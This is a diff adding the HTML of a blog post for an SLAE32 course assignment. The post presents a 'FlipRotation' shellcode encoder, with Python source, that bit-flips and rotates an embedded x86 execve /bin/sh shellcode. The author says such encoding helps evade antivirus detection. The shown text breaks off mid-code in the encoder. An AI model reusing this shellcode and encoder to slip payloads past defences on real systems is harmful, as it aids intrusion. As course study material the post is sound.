@@ -1,0 +1,901 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>SLAE32 Assignment 4 - Custom Encoder/Decoder Shellcode (FlipRotation Encoder/Decoder) | nibbles</title>
+<meta name="keywords" content="slae32">
+<meta name="description" content="This post introduces the forth mission to my SLAE32 journey.
+A really really handful and challenging assignment. It was hard but worth it. Thus, I named my custom encoder/decoder shellcode as FlipRotation Shellcode
+Introduction The forth assignment goal was to create my own custom encoder and decoder of the execve stack shellcode. AS ou may know, the purpose is to execute /bin/sh A shellcode encoder can be used for different purposes mainly make it harder to detect by AV engines or simply avoid bad characters (such as null-bytes).">
+<meta name="author" content="nibbles">
+<link rel="canonical" href="https://0xnibbles.github.io/posts/slae_32_assignment_4/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.bccfefac377bc340f06c260aed1bddf49a4354816d7c570d6aac75a997986c95.css" integrity="sha256-vM/vrDd7w0DwbCYK7Rvd9JpDVIFtfFcNaqx1qZeYbJU=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://0xnibbles.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://0xnibbles.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://0xnibbles.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://0xnibbles.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://0xnibbles.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="SLAE32 Assignment 4 - Custom Encoder/Decoder Shellcode (FlipRotation Encoder/Decoder)" />
+<meta property="og:description" content="This post introduces the forth mission to my SLAE32 journey.
+A really really handful and challenging assignment. It was hard but worth it. Thus, I named my custom encoder/decoder shellcode as FlipRotation Shellcode
+Introduction The forth assignment goal was to create my own custom encoder and decoder of the execve stack shellcode. AS ou may know, the purpose is to execute /bin/sh A shellcode encoder can be used for different purposes mainly make it harder to detect by AV engines or simply avoid bad characters (such as null-bytes)." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://0xnibbles.github.io/posts/slae_32_assignment_4/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-12-28T16:39:09+00:00" />
+<meta property="article:modified_time" content="2022-12-28T16:39:09+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="SLAE32 Assignment 4 - Custom Encoder/Decoder Shellcode (FlipRotation Encoder/Decoder)"/>
+<meta name="twitter:description" content="This post introduces the forth mission to my SLAE32 journey.
+A really really handful and challenging assignment. It was hard but worth it. Thus, I named my custom encoder/decoder shellcode as FlipRotation Shellcode
+Introduction The forth assignment goal was to create my own custom encoder and decoder of the execve stack shellcode. AS ou may know, the purpose is to execute /bin/sh A shellcode encoder can be used for different purposes mainly make it harder to detect by AV engines or simply avoid bad characters (such as null-bytes)."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://0xnibbles.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "SLAE32 Assignment 4 - Custom Encoder/Decoder Shellcode (FlipRotation Encoder/Decoder)",
+      "item": "https://0xnibbles.github.io/posts/slae_32_assignment_4/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "SLAE32 Assignment 4 - Custom Encoder/Decoder Shellcode (FlipRotation Encoder/Decoder)",
+  "name": "SLAE32 Assignment 4 - Custom Encoder\/Decoder Shellcode (FlipRotation Encoder\/Decoder)",
+  "description": "This post introduces the forth mission to my SLAE32 journey.\nA really really handful and challenging assignment. It was hard but worth it. Thus, I named my custom encoder/decoder shellcode as FlipRotation Shellcode\nIntroduction The forth assignment goal was to create my own custom encoder and decoder of the execve stack shellcode. AS ou may know, the purpose is to execute /bin/sh A shellcode encoder can be used for different purposes mainly make it harder to detect by AV engines or simply avoid bad characters (such as null-bytes).",
+  "keywords": [
+    "slae32"
+  ],
+  "articleBody": " This post introduces the forth mission to my SLAE32 journey.\nA really really handful and challenging assignment. It was hard but worth it. Thus, I named my custom encoder/decoder shellcode as FlipRotation Shellcode\nIntroduction The forth assignment goal was to create my own custom encoder and decoder of the execve stack shellcode. AS ou may know, the purpose is to execute /bin/sh A shellcode encoder can be used for different purposes mainly make it harder to detect by AV engines or simply avoid bad characters (such as null-bytes).\nFlipRotation Algorithm Overview The inspiration for this algorithm was the known CBC bit-flipping attack but appliyng a simple variation to our context.\nMore specifically, the steps are\nWe pick each shelcode byte and flip the last bit using a xor operation - flipped_shellbyte = shellbyte ^ 0x01 Based on that output the rotation direction is defined. We rotate right if odd or left if even. The number of rotation positions is defined by the loop index value (number of interations) of the loop at that time. If we rotate right we append 0x2 afther the encoded byte and if we rotate left we append 0xff Put the byte 0xa0 as the shellcode end marker The follwoing diagram can help to understand better this process.\nRegarding decoding, it is just simply reverting the steps and we have our original shellcode back.\nFrom my experience developing the decoder in assembly was much simpler than implementing the encoder login in Python.\nEncoder The FlipRotation encoder was developed in Python language. The Encoder class supports various encoding modes but we will focused only in insertion mode.\nFlipRotation Encoder #!/usr/bin/python3 #!/usr/bin/python3 # # The FlipRotation Shellcode encoder # # Rotates back and flips the lowest bit of each byte. # import argparse import secrets import logging import sys secretsGenerator = secrets.SystemRandom() c_style_shellcode = (b\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\") # bin/sh def banner(): print(''' _______________________________________________________________ ",
+  "wordCount" : "2614",
+  "inLanguage": "en",
+  "datePublished": "2022-12-28T16:39:09Z",
+  "dateModified": "2022-12-28T16:39:09Z",
+  "author":{
+    "@type": "Person",
+    "name": "nibbles"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://0xnibbles.github.io/posts/slae_32_assignment_4/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "nibbles",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://0xnibbles.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://0xnibbles.github.io/" accesskey="h" title="nibbles (Alt + H)">nibbles</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://0xnibbles.github.io/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://0xnibbles.github.io/about.html" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://0xnibbles.github.io/categories/" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://0xnibbles.github.io/projects/" title="Projects">
+                    <span>Projects</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://0xnibbles.github.io/archives" title="Archive">
+                    <span>Archive</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://0xnibbles.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://0xnibbles.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://0xnibbles.github.io/posts/">Posts</a></div>
+    <h1 class="post-title">
+      SLAE32 Assignment 4 - Custom Encoder/Decoder Shellcode (FlipRotation Encoder/Decoder)
+    </h1>
+    <div class="post-meta"><span title='2022-12-28 16:39:09 +0000 UTC'>December 28, 2022</span>&nbsp;·&nbsp;13 min&nbsp;·&nbsp;nibbles
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#introduction" aria-label="Introduction">Introduction</a></li>
+                <li>
+                    <a href="#fliprotation-algorithm-overview" aria-label="FlipRotation Algorithm Overview">FlipRotation Algorithm Overview</a><ul>
+                        
+                <li>
+                    <a href="#encoder" aria-label="Encoder">Encoder</a><ul>
+                        
+                <li>
+                    <a href="#fliprotation-encoder" aria-label="FlipRotation Encoder">FlipRotation Encoder</a></li>
+                <li>
+                    <a href="#encoder-output" aria-label="Encoder Output">Encoder Output</a></li></ul>
+                </li>
+                <li>
+                    <a href="#decoder" aria-label="Decoder">Decoder</a><ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#divide-and-conquer-the-fliprotation-decoder" aria-label="Divide and Conquer the FlipRotation Decoder">Divide and Conquer the FlipRotation Decoder</a></li></ul>
+                    </ul>
+                </li>
+                <li>
+                    <a href="#compiling-and-testing-the-fliprotation-decoder" aria-label="Compiling and Testing the FlipRotation Decoder">Compiling and Testing the FlipRotation Decoder</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p><img loading="lazy" src="/slae32/slae32.png#center" alt="SLAE32"  title="SLAE32"  />
+</p>
+<p>This post introduces the forth mission to my SLAE32 journey.</p>
+<p>A really really handful and challenging assignment. It was hard but worth it. Thus, I named my custom encoder/decoder shellcode as <code>FlipRotation Shellcode</code></p>
+<h2 id="introduction">Introduction<a hidden class="anchor" aria-hidden="true" href="#introduction">#</a></h2>
+<p>The forth assignment goal was to create my own custom encoder and decoder of the <code>execve stack shellcode</code>. AS ou may know, the purpose is to execute <code>/bin/sh</code>
+ 
+A shellcode encoder can be used for different purposes mainly make it harder to detect by AV engines or simply avoid bad characters (such as null-bytes).</p>
+<h2 id="fliprotation-algorithm-overview">FlipRotation Algorithm Overview<a hidden class="anchor" aria-hidden="true" href="#fliprotation-algorithm-overview">#</a></h2>
+<p>The inspiration for this algorithm was the known <code>CBC bit-flipping attack</code> but appliyng a simple variation to our context.</p>
+<p>More specifically, the steps are</p>
+<ol>
+<li>We pick each shelcode byte and flip the last bit using a <code>xor</code> operation - <code>flipped_shellbyte = shellbyte ^ 0x01</code></li>
+<li>Based on that output the rotation direction is defined. We rotate right if odd or left if even. The number of rotation positions is defined by the loop index value (number of interations) of the loop at that time.</li>
+<li>If we rotate right we append <code>0x2</code> afther the encoded byte and if we rotate left we append <code>0xff</code></li>
+<li>Put the byte <code>0xa0</code> as the shellcode end marker</li>
+</ol>
+<p>The follwoing diagram can help to understand better this process.</p>
+<p><img loading="lazy" src="/slae32/3/fliprotation.jpg#center" alt="FlipRotation"  title="FlipRotation"  />
+</p>
+<p>Regarding decoding, it is just simply reverting the steps and we have our original shellcode back.</p>
+<p>From my experience developing the decoder in assembly was much simpler than implementing the encoder login in Python.</p>
+<h3 id="encoder">Encoder<a hidden class="anchor" aria-hidden="true" href="#encoder">#</a></h3>
+<p>The FlipRotation encoder was developed in Python language. The <code>Encoder</code> class supports various encoding modes but we will focused only in <code>insertion</code> mode.</p>
+<h4 id="fliprotation-encoder">FlipRotation Encoder<a hidden class="anchor" aria-hidden="true" href="#fliprotation-encoder">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># The FlipRotation Shellcode encoder</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Rotates back and flips the lowest bit of each byte.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> secrets
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> logging
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>secretsGenerator <span style="color:#f92672">=</span> secrets<span style="color:#f92672">.</span>SystemRandom()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>c_style_shellcode <span style="color:#f92672">=</span> (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80</span><span style="color:#e6db74">&#34;</span>) <span style="color:#75715e"># bin/sh</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">banner</span>():
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;&#39;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        _______________________________________________________________
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">         &lt;The &#34;FlipRotation&#34; Encoder - Bit flip and rotate your shellcode
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        ---------------------------------------------------------------
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            \   ^__^
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            \   (oo)\_______
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                (__)\       )\/</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    ||----w |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    ||     ||       
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">         &#39;&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#----------------------------</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">bin2hex</span>(binstr):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> hex(int(binstr,<span style="color:#ae81ff">2</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Encoder</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">randomKeyGenerator</span>(self):
+</span></span><span style="display:flex;"><span>        byte <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0x&#39;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2</span>):
+</span></span><span style="display:flex;"><span>            hexDigits <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x01</span>,<span style="color:#ae81ff">0x02</span>,<span style="color:#ae81ff">0x03</span>,<span style="color:#ae81ff">0x04</span>,<span style="color:#ae81ff">0x05</span>,<span style="color:#ae81ff">0x06</span>,<span style="color:#ae81ff">0x07</span>,<span style="color:#ae81ff">0x08</span>,<span style="color:#ae81ff">0x09</span>,<span style="color:#ae81ff">0x0a</span>,<span style="color:#ae81ff">0x0b</span>,<span style="color:#ae81ff">0x0c</span>,<span style="color:#ae81ff">0x0d</span>,<span style="color:#ae81ff">0x0e</span>,<span style="color:#ae81ff">0x0f</span>]
+</span></span><span style="display:flex;"><span>            nibble <span style="color:#f92672">=</span> secretsGenerator<span style="color:#f92672">.</span>choice(hexDigits) <span style="color:#75715e"># it gets in decimal not hex format</span>
+</span></span><span style="display:flex;"><span>            byte <span style="color:#f92672">=</span> byte <span style="color:#f92672">+</span> hex(nibble)[<span style="color:#ae81ff">2</span>:] <span style="color:#75715e"># hex class is str type. Appending to 0x</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> int(byte,<span style="color:#ae81ff">16</span>) <span style="color:#75715e"># convert key to bytes and return</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self,enc_type, key<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> enc_type <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;not&#34;</span>:
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> key <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>key <span style="color:#f92672">=</span> key
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">&#34;[*] Key Provided by the user. Doing magic with it&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>key <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>randomKeyGenerator()
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">&#34;[*] Doing magic with a (pseudo) Random key&#34;</span>)
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;[*] Key: &#34;</span><span style="color:#f92672">+</span>hex(self<span style="color:#f92672">.</span>key))
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Function to left</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># rotate n by d bits</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leftRotate</span>(self,shellbits, d):
+</span></span><span style="display:flex;"><span>        tmp <span style="color:#f92672">=</span> shellbits[d:] <span style="color:#f92672">+</span> shellbits[<span style="color:#ae81ff">0</span>:d]
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> tmp
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Function to right</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># rotate n by d bits</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rightRotate</span>(self, shellbits, d):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>leftRotate(shellbits, len(shellbits) <span style="color:#f92672">-</span> d)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">insertion_encode</span>(self, shellcode):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        encoded <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#75715e"># 0x format</span>
+</span></span><span style="display:flex;"><span>        encoded2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#75715e"># \x format</span>
+</span></span><span style="display:flex;"><span>        rotation_direction <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        rotation_counter <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> shellbyte <span style="color:#f92672">in</span> shellcode:
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            flipped_shellbyte <span style="color:#f92672">=</span> shellbyte <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x01</span>    <span style="color:#75715e"># flip lowest bit</span>
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> bin(flipped_shellbyte)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;0&#39;</span>:
+</span></span><span style="display:flex;"><span>                logging<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Flipped byte - odd - &#34;</span><span style="color:#f92672">+</span>str(flipped_shellbyte))
+</span></span><span style="display:flex;"><span>                rotated_shellbyte <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>rightRotate(format(flipped_shellbyte,<span style="color:#e6db74">&#39;08b&#39;</span>),rotation_counter<span style="color:#f92672">%</span> <span style="color:#ae81ff">8</span> ) <span style="color:#75715e"># 8 because we are rotating with 8 bits</span>
+</span></span><span style="display:flex;"><span>                rotation_direction <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0x02&#39;</span> 
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                logging<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Flipped byte - even - &#34;</span><span style="color:#f92672">+</span>str(flipped_shellbyte))
+</span></span><span style="display:flex;"><span>                rotated_shellbyte <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>leftRotate(format(flipped_shellbyte,<span style="color:#e6db74">&#39;08b&#39;</span>),rotation_counter<span style="color:#f92672">%</span> <span style="color:#ae81ff">8</span> )  <span style="color:#75715e"># 8 because we are rotating with 8 bits</span>
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">&#34;After rotation: &#34;</span><span style="color:#f92672">+</span> bin2hex(self<span style="color:#f92672">.</span>leftRotate(format(flipped_shellbyte,<span style="color:#e6db74">&#39;08b&#39;</span>),rotation_counter<span style="color:#f92672">%</span><span style="color:#ae81ff">8</span>)))
+</span></span><span style="display:flex;"><span>                rotation_direction <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0xff&#39;</span>
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            final_shellbyte <span style="color:#f92672">=</span>  bin2hex(rotated_shellbyte)
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            rotation_counter <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            encoded <span style="color:#f92672">+=</span> final_shellbyte <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;,&#39;</span> <span style="color:#f92672">+</span> rotation_direction <span style="color:#f92672">+</span><span style="color:#e6db74">&#39;,&#39;</span>  <span style="color:#75715e"># \x format</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            encoded2 <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x&#39;</span> <span style="color:#f92672">+</span> final_shellbyte[<span style="color:#ae81ff">2</span>:] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x&#39;</span> <span style="color:#f92672">+</span> rotation_direction[<span style="color:#ae81ff">2</span>:] <span style="color:#75715e"># \x format</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[*] </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x format: &#34;</span>)
+</span></span><span style="display:flex;"><span>        encoded2 <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x&#39;</span> <span style="color:#f92672">+</span> hex(self<span style="color:#f92672">.</span>key)[<span style="color:#ae81ff">2</span>:]   <span style="color:#75715e"># add marker</span>
+</span></span><span style="display:flex;"><span>        print(encoded2)
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[*] 0x format: &#34;</span>)
+</span></span><span style="display:flex;"><span>        encoded <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;0x&#39;</span> <span style="color:#f92672">+</span> hex(self<span style="color:#f92672">.</span>key)[<span style="color:#ae81ff">2</span>:] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;,&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;0x&#39;</span> <span style="color:#f92672">+</span> hex(self<span style="color:#f92672">.</span>key)[<span style="color:#ae81ff">2</span>:] <span style="color:#75715e">#add marker</span>
+</span></span><span style="display:flex;"><span>        print(encoded)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>   
+</span></span><span style="display:flex;"><span>    shellcode <span style="color:#f92672">=</span> bytearray(c_style_shellcode)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[*] Shellcode length: &#34;</span><span style="color:#f92672">+</span>str(len(shellcode))<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[*] Shellcode: &#34;</span><span style="color:#f92672">+</span>str(c_style_shellcode)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># -------------------KEY-------------- </span>
+</span></span><span style="display:flex;"><span>    key <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xa0</span>  <span style="color:#75715e"># can&#39;t be 0x02 or 0xff. used for rotation direction</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#####################################</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># -------------Encode Type-----------</span>
+</span></span><span style="display:flex;"><span>    enc_type <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;insertion&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#####################################</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> enc_type <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;not&#34;</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        encoder <span style="color:#f92672">=</span> Encoder(enc_type)
